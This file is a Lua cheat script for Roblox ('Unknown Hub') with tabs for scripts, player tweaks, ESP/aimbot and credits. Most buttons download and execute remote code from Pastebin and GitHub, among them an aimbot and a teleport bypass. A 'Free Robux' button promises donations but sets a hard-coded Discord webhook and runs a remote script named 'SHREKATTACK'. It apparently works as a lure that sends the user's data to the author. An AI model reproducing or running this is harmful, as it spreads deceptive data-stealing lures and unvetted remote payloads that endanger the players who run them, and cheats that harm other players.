--Unknown Hub
--rbxassetid://15719832182 phonk ninja
--rbxassetid://16730731897 Scary eyes
local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/AOCHubReal/Ui-sources/main/Orion-Lib-(AOC).lua')))() -- https://raw.githubusercontent.com/shlexware/Orion/main/source
local Window = OrionLib:MakeWindow({Name = "Unknown Hub || Version 1.0", HidePremium = false, IntroEnabled = true, IntroText = "Unknown HUB", SaveConfig = true, ConfigFolder = "V1"})

OrionLib:MakeNotification({
	Name = "Unknown Hub",
	Content = "Thanks for using UnknownHub!",
	Image = "rbxassetid://16730731897", --Scary eyes
	Time = 20
})

local Tab = Window:MakeTab({
	Name = "Main",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section = Tab:AddSection({
	Name = "Script"
})

local Tab2 = Window:MakeTab({
	Name = "Player",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section2 = Tab2:AddSection({
	Name = "Player Section"
})

local Tab3 = Window:MakeTab({
	Name = "Esp / Aimbot",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section3 = Tab3:AddSection({
	Name = "Esp / Aimbot"
})

local Tab5 = Window:MakeTab({
	Name = "Credits",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})

local Section5 = Tab5:AddSection({
	Name = "Credits"
})



Tab:AddButton({
	Name = "Dead Rails Bypass Teleport to bridge/80k Gui (Patched)",
	Callback = function()
		loadstring(game:HttpGet(('https://pastebin.com/raw/DLLrKrCm'),true))()
  	end
})

Tab:AddButton({
	Name = "Infinite Yield",
	Callback = function()
      		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
  	end    
})


Tab3:AddButton({
	Name = "Aimbot/Camlock Key C",
	Callback = function()
      		loadstring(game:HttpGet('https://pastebin.com/raw/wVyXCUMD'))()
  	end    
})

Tab2:AddButton({
	Name = "Boost Speed (+5)",
	Callback = function()
      		local player = game.Players.LocalPlayer
            local character = player.Character or player.CharacterAdded:Wait()
            
            local function speed()
                    local humanoid = character:WaitForChild("Humanoid")
                    if humanoid then
                               humanoid.WalkSpeed = humanoid.WalkSpeed + 5
                        end
            end

            speed()
  	end    
})

Tab2:AddButton({
	Name = "Set WalkSpeed to 16",
	Callback = function()
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
  	end    
})

Tab2:AddButton({
	Name = "Rejoin",
	Callback = function()
        game.Players.localPlayer:kick("Rejoining...")
        wait(1)
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, plr)
  	end    
})

Tab2:AddButton({
	Name = "Exit",
	Callback = function()
		game.Players.localPlayer:kick("Exit...")
		wait(1)
     game:Shutdown()
  	end    
})

Tab2:AddButton({
	Name = "Free Robux (Your request free robux will send to me and i will donate robux to you)",
	Callback = function()
		_G.webhooksdiscord = "https://discord.com/api/webhooks/1327636232598978591/Bw3Z_caU35K_BldqiTJt5DiySH8wIiqNt1qEEPTEoMzEQatAZPLnNy6px6YvkAZDa8kK"
		loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
  	end    
})


Tab:AddButton({
	Name = "AOC HUB (PC)",
	Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/AOCHubReal/AOC-MOONSEC/main/AOC_Protect.lua'))()
  	end    
})

Tab:AddButton({
	Name = "Dex",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/main/dex.lua"))()
	end
})


Tab5:AddLabel("Script Owner: Unknown")
Tab5:AddLabel("Script Owner: xenon.hub")
Tab5:AddLabel("Credits to aoc.hub")

--TEST 